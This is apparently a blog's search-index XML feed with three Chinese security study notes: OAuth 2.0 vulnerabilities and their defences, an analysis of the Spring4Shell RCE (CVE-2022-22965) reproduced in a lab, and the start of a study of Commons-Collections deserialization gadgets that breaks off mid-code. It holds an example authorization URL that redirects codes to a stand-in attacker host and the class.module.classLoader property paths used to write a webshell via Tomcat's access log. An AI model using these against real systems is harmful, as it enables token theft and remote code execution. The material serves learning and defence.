<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Oauth2.0安全问题</title>
      <link href="/2022/05/13/Oauth2-0%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
      <url>/2022/05/13/Oauth2-0%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开局一张图</p><img src="/2022/05/13/Oauth2-0%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image_g44-RXo8eP.png" class=""><p>根据自己对Oauth2.0授权码模式的理解简单画了个图，图中包含了Oauth2.0授权码模式的流程和oauth的几个常见的特性漏洞。网上oauth的图很多很多，但是总感觉别人画的始终是别人的理解，不根据自己的理解画一遍都不知道自己哪里不会（菜鸡的感慨~）</p><p>接下来挨个简介下标红的三种问题，下面的问题描述都较为简单，主要是作为自己的笔记记录，不做教程性的介绍，若想要看详细的原理介绍，推荐<a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a>的几个好文</p><h1 id="1-通过CSRF将攻击者code绑定受害者token"><a href="#1-通过CSRF将攻击者code绑定受害者token" class="headerlink" title="1.通过CSRF将攻击者code绑定受害者token"></a>1.通过CSRF将攻击者code绑定受害者token</h1><p>一句话描述：攻击者通过CSRF漏洞，使已登录的用户把攻击者的CODE拿去授权服务器获取accces_token令牌，攻击者就可以通过accces_token令牌访问被绑定用户的资源服务器</p><img src="/2022/05/13/Oauth2-0%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/1652280594235-fb7ff3ed-7d20-41fd-b8c0-4fea1e762a80.png" class=""><p>防御方法：<strong>在请求授权码时，增加随机state参数（通常是6为字母加数字），在返回授权码的回调接口中验证state参数是否和发送的相同</strong>，这样可以确保授权码和授权请求是由同一个用户发起的</p><h1 id="2-URL重定向导致code泄露"><a href="#2-URL重定向导致code泄露" class="headerlink" title="2.URL重定向导致code泄露"></a>2.URL重定向导致code泄露</h1><p>这个漏洞是oauth比较常见且较容易理解的，若授权服务器未校验重定向url或校验不严格，攻击者可构造携带恶意的重定向url给用户授权，例如</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxx.com/oauth/authorize?response_type=code&amp;client_id=CLIENT_ID&amp;redirect_uri=http://www.hacker.com</span><br></pre></td></tr></table></figure><p>用户授权后的code将发送到恶意的<code>redirect_uri</code>，攻击者即可获得授权码code。</p><p>还有一种情况是若授权服务器严格校验<code>redirect_uri</code>为白名单域名，则可以结合白名单域名下可控的静态页面或XSS利用，将<code>redirect_uri</code>设置为白名单域名下静态页面链接或XSS的链接，并在并在链接页面下嵌入类似<code>&lt;img src =&quot;https://clientA.com/catch&quot;&gt;</code>发起跨域请求的代码，攻击者在<code>clientA.com</code>收到的请求Referer头中即可查看到code，攻击步骤如下</p><img src="/2022/05/13/Oauth2-0%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image_nFhw0WGaWy.png" class=""><p>并不是所有请求都携带Referer头，利用Referer头请求一般有如下规则</p><img src="/2022/05/13/Oauth2-0%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image_U2uitWmtbD.png" class=""><h1 id="3-code未绑定clent-id导致一code多客户端使用"><a href="#3-code未绑定clent-id导致一code多客户端使用" class="headerlink" title="3.code未绑定clent_id导致一code多客户端使用"></a>3.code未绑定clent_id导致一code多客户端使用</h1><p>假设攻击者想要登录“极客时间”的软件B上的用户G，他可在授权服务器注册一个软件A，获得合法的 <code>app_id</code> 和 <code>app_secret</code>，当用户G对软件B进行授权产生了一个授权码 codeB，<strong>如果攻击者获取到了这个codeB，且授权服务器未绑定code与客户端ID时</strong>，攻击者就能通过codeB在软件A上授权，获取到用户G的access_token，从而获取用户G的数据</p><p>这一问题通常建立在授权码code失窃的场景下，也就是可以通过上面重定向的漏洞获取code</p><img src="/2022/05/13/Oauth2-0%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image_7IKdMk8Vab.png" class=""><p>怎么防御呢？</p><ul><li><p>  授权码需要绑定客户端ID，并在获取access_token时校验授权码是否为绑定的客户端ID；</p></li><li><p>  授权码 code一次失效，code使用过一次之后，授权服务需要删除这个 code；</p></li></ul><h1 id="4-水平越权"><a href="#4-水平越权" class="headerlink" title="4.水平越权"></a>4.水平越权</h1><p>最后这个问题算是资源服务器的问题，没有在开局的图中体现出来，开局的图主要说明的是客户端和授权服务器的流程，所以这个放最后讲下，先看下图</p><img src="/2022/05/13/Oauth2-0%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image_oHtFLdiLob.png" class=""><p>小兔打单软件是授权服务器，可以给多个商家授权，商家就属于客户端，授权服务器生成的access_token返回到客户端的tokenCallback处理（开局图流程的最下方），这里将access_token转化为真正的用户数据，也就是这里的商家ID，此时受保护资源服务的API没有对商家 ID 和订单 ID 做归属判断，那么商家A就可以能查看到商家B的订单数据</p><p>防御方法：资源服务API需要对API操作的数据与access_token解析的权限内容做归属判断</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a class="link"   href="https://zq99299.github.io/note-book/oath2/02/02.html"  title="https://zq99299.github.io/note-book/oath2/02/02.html">https://zq99299.github.io/note-book/oath2/02/02.html<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://blog.51cto.com/u_13626762/3113777"  title="https://blog.51cto.com/u_13626762/3113777">https://blog.51cto.com/u_13626762/3113777<i class="fas fa-external-link-alt"></i></a></p><p>[<a class="link"   href="https://www.cnblogs.com/hellowhy/p/15533625.html]" >https://www.cnblogs.com/hellowhy/p/15533625.html]<i class="fas fa-external-link-alt"></i></a>(</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Spring Framework RCE分析</title>
      <link href="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/"/>
      <url>/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p><strong>CVE编号</strong></p><p>CVE-2022-22965</p><p><strong>影响范围</strong></p><ul><li>JDK &gt;= 9</li><li>使用Apache Tomcat 作为Servlet容器，并且使用传统的war包部署方法</li><li>Spring Framework 5.3.0 - 5.3.17，5.2.0 - 5.2.19，以及更早的版本，或其他包含<code>spring-webmvc</code> or <code>spring-webflux</code>依赖的应用</li></ul><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>拉取此漏洞的<a class="link"   href="https://github.com/vulhub/vulhub/tree/master/base/spring/spring-webmvc/5.3.17" >vulhub代码<i class="fas fa-external-link-alt"></i></a>进行复现，我本地环境是<code>jdk11+tomcat8.5.39</code></p><img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/springrce.gif" class="" title="springrce"><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Java内省机制"><a href="#Java内省机制" class="headerlink" title="Java内省机制"></a>Java内省机制</h3><p>Java内省(Introspector)机制就是JDK提供的一套API来查找、设置<code>JavaBean</code>的属性，只要有 <code>getter</code>/<code>setter</code> 方法中的其中一个，那么 Java 的内省机制就会认为存在一个属性，内省的核心类就是<code>Introspector</code>类。</p><p>这里我们新建一个名为<code>Person</code>的<code>JavaBean</code>，使用内省的方法来调用<code>Person</code>类所有属性以及属性的读写方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public class Person &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private Integer age;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        this.name &#x3D; name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Integer getAge() &#123;</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAge(Integer age) &#123;</span><br><span class="line">        this.age &#x3D; age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.BeanInfo;</span><br><span class="line"><span class="keyword">import</span> java.beans.Introspector;</span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyDescriptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        BeanInfo info = Introspector.getBeanInfo(Person.class);</span><br><span class="line">        PropertyDescriptor[] properties =</span><br><span class="line">                info.getPropertyDescriptors();</span><br><span class="line">        <span class="keyword">for</span> (PropertyDescriptor pd : properties) &#123;</span><br><span class="line">            System.out.println(pd.getName());</span><br><span class="line">            System.out.println(<span class="string">&quot;    [*]&quot;</span> + pd.getReadMethod());</span><br><span class="line">            System.out.println(<span class="string">&quot;    [*]&quot;</span> + pd.getWriteMethod());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果除了包含<code>Person</code>类的属性和属性的读写方法之外，另外还包括<code>class</code>属性以及<code>getClass</code>方法，这是因为呢？</p><img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220417095400459.png" class="" title="image-20220417095400459"><h3 id="为什么会有class属性？"><a href="#为什么会有class属性？" class="headerlink" title="为什么会有class属性？"></a>为什么会有class属性？</h3><p>查看<code>Introspector.getBeanInfo(Class&lt;?&gt; beanClass)</code>方法，会将<code>beanClass</code>传入<code>Introspector</code>构造方法，并调用<code>Introspector</code>实例<code>getBeanInfo()</code>方法</p><img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220417101358466.png" class="" title="image-20220417102937868"><p>先跟入<code>Introspector</code>构造方法，<code>stopClass</code>为空就会获取父类<code>java.lang.Object</code>的<code>BeanInfo</code>并赋给<code>superBeanInfo</code></p><img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220417102956944.png" class="" title="image-20220417102956944"><p>完成构造方法后调用<code>getBeanInfo()</code>，<code>getBeanInfo()</code>方法里面的<code>getTargetMethodInfo()</code>、<code>getTargetEventInfo()</code>、<code>getTargetPropertyInfo()</code>几个方法都会先获取<code>superBeanInfo</code>中的值并加到自己的<code>BeanInfo</code>中</p><img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220417110613974.png" class="" title="image-20220417110613974"><img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220417110005105.png" class="" title="image-20220417110005105"><p>因为<code>java.lang.Object</code>存在一个<code>getClass()</code>方法，所以内省机制会认为有<code>class</code>属性。这也就解释了为什么<code>Person</code>类有<code>class</code>属性和<code>getClass</code>方法了。</p><img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220417111434390.png" class="" title="image-20220417111434390"><h3 id="SpirngBean"><a href="#SpirngBean" class="headerlink" title="SpirngBean"></a>SpirngBean</h3><p><code>SpringBean</code>可以当成<code>JavaBean</code>的升级版，由<code>Spring</code>框架的<code>ApplicationContext</code>操控<code>SpringBean</code>，<code>ApplicationContext</code>也称控制反转（IoC）容器，是<code>Spring</code>框架的核心。控制反转就是<strong>用户将对象转为实例过程，变成了容器生产实例，然后通过实例去注入到对应的对象的过程</strong>。</p><img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220417170034353.png" class="" title="image-20220417170034353"><p>简单的可以将<code>Spring</code>容器理解为工厂，<code>SpringBean</code>的生产过程就是我们定义好什么产品（Bean）需要什么样的原材料（Bean中的属性）这样的配置信息，<code>Spring</code>容器负责将原材料生产（实例化）为产品并存储（Cache）</p><blockquote><p>在SpringBean要使用时，第一步就是从SpringBean的注册表中获取Bean的配置信息，然后根据配置信息实例化Bean，实例化以后的Bean被映射到了Spring容器中，并且被存储在了Bean Cache池中，当应用程序要使用Bean时，会向Bean Cache池发起调用。</p></blockquote><p>参考<code>panda</code>大佬画的一张图</p><img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220417115224077.png" class="" title="image-20220417115224077"><h2 id="关键代码分析"><a href="#关键代码分析" class="headerlink" title="关键代码分析"></a>关键代码分析</h2><p>根据历史漏洞分析<a class="link"   href="http://rui0.cn/archives/1158?wglebi=4dr1b" >文章<i class="fas fa-external-link-alt"></i></a>，看下通到<code>CachedIntrospectionResults</code>的调用链，可以看到在<code>getPropertyAccessorForPropertyPath</code>递归了8次</p><img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220417235759704.png" class="" title="image-20220417235759704"><p><code>getPropertyAccessorForPropertyPath</code>方法根据分隔符<code>.</code>将传入的字符串分割，并从左往右递归处理嵌套属性（嵌套结构的理解可以<a class="link"   href="https://www.cnblogs.com/binarylei/p/10267928.html" >参考文章<i class="fas fa-external-link-alt"></i></a>），所以如果我们想通过class去调用classLoader的属性，只需要通过class.classLoader的方式即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> AbstractNestablePropertyAccessor <span class="title">getPropertyAccessorForPropertyPath</span><span class="params">(String propertyPath)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取嵌套属性的第一个属性</span></span><br><span class="line">        <span class="comment">// 比如对于属性: foo.bar[0].name</span></span><br><span class="line">        <span class="comment">// 首先获取到 foo 的索引位置</span></span><br><span class="line">        <span class="comment">// getFirstNestedPropertySeparatorIndex是详细的方法</span></span><br><span class="line">        <span class="keyword">int</span> pos = PropertyAccessorUtils.getFirstNestedPropertySeparatorIndex(propertyPath);</span><br><span class="line">        <span class="comment">// Handle nested properties recursively.</span></span><br><span class="line">        <span class="comment">//递归处理嵌套属性</span></span><br><span class="line">        <span class="keyword">if</span> (pos &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// 获取所在的属性和对应的name</span></span><br><span class="line">            String nestedProperty = propertyPath.substring(<span class="number">0</span>, pos);</span><br><span class="line">            String nestedPath = propertyPath.substring(pos + <span class="number">1</span>);</span><br><span class="line">            AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);</span><br><span class="line">            <span class="comment">//递归调用</span></span><br><span class="line">            <span class="keyword">return</span> nestedPa.getPropertyAccessorForPropertyPath(nestedPath);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所以我们可以通过<code>Tomcat Access Log</code>来写shell。<code>Tomcat Access Log</code>是通过 <code>server.xml</code> 配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Valve</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span> <span class="attr">directory</span>=<span class="string">&quot;logs&quot;</span> <span class="attr">prefix</span>=<span class="string">&quot;access.&quot;</span> <span class="attr">suffix</span>=<span class="string">&quot;.log&quot;</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">pattern</span>=<span class="string">&quot;%h %l %u %t &quot;</span>%<span class="attr">r</span>&quot; %<span class="attr">s</span> %<span class="attr">b</span> &quot;%&#123;<span class="attr">Referer</span>&#125;<span class="attr">i</span>&quot; &quot;%&#123;<span class="attr">User-Agent</span>&#125;<span class="attr">i</span>&quot; %&#123;<span class="attr">X-Forwarded-For</span>&#125;<span class="attr">i</span> &quot;%<span class="attr">Dms</span>&quot;&quot; <span class="attr">resolveHosts</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>根据前面对<code>SpirngBean</code>和内省机制的理解，通过xml文件加载的配置属性，实际上也是可以通过内省机制修改的，Tomcat具体有哪些属性可以参考<a class="link"   href="https://tomcat.apache.org/tomcat-8.5-doc/config/valve.html" >官方文档<i class="fas fa-external-link-alt"></i></a>，通过修改下面的几个属性可创建任意后缀名的文件，即可写入一个shell</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.parent.pipeline.first.directory =</span><br><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.parent.pipeline.first.prefix =</span><br><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.parent.pipeline.first.suffix = </span><br><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.parent.pipeline.first.fileDateFormat =</span><br></pre></td></tr></table></figure><h2 id="为什么只有-gt-jdk9受影响？"><a href="#为什么只有-gt-jdk9受影响？" class="headerlink" title="为什么只有 &gt;= jdk9受影响？"></a>为什么只有 &gt;= jdk9受影响？</h2><p>此漏洞其实算是<code>CVE-2010-1622</code>的JDK高版本利用，<code>CVE-2010-1622</code>的修复增加了<code>class.classLoader</code>的黑名单限制，而<code>jdk9</code>以下版本只能通过<code>class.classLoader</code>利用，<code>pd.getName</code>为<code>classLoader</code>时，<code>beanClass</code>为<code>Class</code>，即所以没法利用，黑名单判断代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Class.class != beanClass || !<span class="string">&quot;classLoader&quot;</span>.equals(pd.getName()) &amp;&amp; !<span class="string">&quot;protectionDomain&quot;</span>.equals(pd.getName())) &#123;</span><br><span class="line">    ...... <span class="comment">// 正常逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>jdk9</code>引入了<a class="link"   href="https://blog.csdn.net/charles_neil/article/details/114460702" >模块系统<i class="fas fa-external-link-alt"></i></a>，可通过<code>class.module.classLoader</code>使得当<code>pd.getName</code>为<code>classLoader</code>时，<code>Class.class != beanClass</code>，从而不走后面<code>||</code>判断逻辑导致绕过</p><img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220418003620510.png" class="" title="image-20220418003620510"><h1 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h1><h1 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h1><p>由于本地调试环境问题，导致调试前踩了不少坑，这里记录下</p><h3 id="1-CATALINA-BASE"><a href="#1-CATALINA-BASE" class="headerlink" title="1.CATALINA_BASE"></a><strong>1.CATALINA_BASE</strong></h3><p><code>tomcat</code>默认配置的<code>CATALINA_BASE</code>和<code>CATALINA_HOME</code>是同一目录，这两者的区别可参考<a class="link"   href="https://tomcat.apache.org/tomcat-8.5-doc/introduction.html#CATALINA_HOME_and_CATALINA_BASE" >官网介绍<i class="fas fa-external-link-alt"></i></a></p><p>用idea配置tomcat后，启动时<code>CATALINA_BASE</code>并没有和<code>CATALINA_HOME</code>在同一目录，而是在C盘的用户目录下</p><img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220409181507272.png" class="" title="image-20220409181507272"><p>写入的<code>shell</code>在<code>CATALINA_BASE</code>下，而不是tomcat的安装目录<code>CATALINA_HOME</code>下，这就导致生成的shell访问不到</p><img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220409182426895.png" class="" title="image-20220409182426895"><img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220409181759954.png" class="" title="image-20220409181759954"><p><strong>解决办法</strong></p><p>idea中配置tomcat环境变量，指定<code>CATALINA_BASE</code>为本地tomcat目录，然后重启即可</p><img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220409222330606.png" class="" title="image-20220409222330606"><h3 id="2-idea配置tomcat端口不生效"><a href="#2-idea配置tomcat端口不生效" class="headerlink" title="2.idea配置tomcat端口不生效"></a>2.idea配置tomcat端口不生效</h3><p>为了解决上一个问题，idea配置了<code>CATALINA_BASE</code>后，idea中不管怎么设置tomcat服务的<code>HTTP port</code>，运行时始终都是以tomcat默认的<code>8080</code>端口启动（一直以为是我项目配置问题，这里卡了半天也没整出来，吐了…）</p><img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220409223054122.png" class="" title="image-20220409223054122"><img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220409223908669.png" class="" title="image-20220409223908669"><p>还不清楚具体是什么原因导致的，如果要修改端口只能修改tomcat的<code>server.xml</code>配置文件，或者直接访问默认的<code>8080</code>端口</p><img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220409224548056.png" class="" title="image-20220409224548056"><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link"   href="http://rui0.cn/archives/1158" >http://rui0.cn/archives/1158<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://xz.aliyun.com/t/11129#toc-13" >https://xz.aliyun.com/t/11129#toc-13<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://tttang.com/archive/1532/" >https://tttang.com/archive/1532/<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement" >https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://github.com/vulhub/vulhub/tree/master/base/spring/spring-webmvc/5.3.17" >https://github.com/vulhub/vulhub/tree/master/base/spring/spring-webmvc/5.3.17<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22965" >https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22965<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://blog.csdn.net/Honnyee/article/details/85337647" >https://blog.csdn.net/Honnyee/article/details/85337647<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://juejin.cn/post/6966158157202587662" >https://juejin.cn/post/6966158157202587662<i class="fas fa-external-link-alt"></i></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化之CC链1-7学习</title>
      <link href="/2022/03/25/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE1-7%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/03/25/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE1-7%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>假设某服务器接收java字节码并使用<code>ObjectInputStream.readObject</code>方法进行反序列化，我们将包含执行命令代码的Test类序列化后直接传给服务器，这时服务器上并不会触发命令，而是报错，因为会找不到Test类，所以想要触发命令我们就需要找服务器上存在的类，如何通过存在的类在反序列化的时触发命令?</p><p><strong>如果反序列化的类定义了<code>readObject</code>方法，在服务器上执行<code>ObjectInputStream.readObject</code>时，会自动调用反序列化类中的<code>readObject</code>方法，更进一步的，如果反序列化类的<code>readObject</code>方法中执行了该类成员变量的某些方法，而这些成员变量是可控的，一个反序列化利用或许就出现了</strong>。在<code>readObject</code>反序列化中有个重要利用链就是Commons-Collections组件的利用链，该组件是各种中间件必用的组件，利用的非常广泛。</p><p>先看下CommonsCollections链中都会用到的几个类，这几个类是调用任意类和方法的关键，都实现了<code>Transformer</code>接口，该接口就一个<code>transform</code>方法，我们重点关注这几个实现类的<code>transform</code>方法的逻辑。</p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>构造方法作用就是将传入的对象保存为一个常量，调用实例的transform方法就返回该常量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p>主要作用是通过反射调用传入对象的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p>实例化这个类需要传入<code>Transformer</code>的数组，调用这个类的<code>transform</code>方法就会遍历数组中每个元素的<code>transform</code>方法，每次<code>transform</code>方法返回的对象会作为下一个<code>transform</code>方法的输入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span 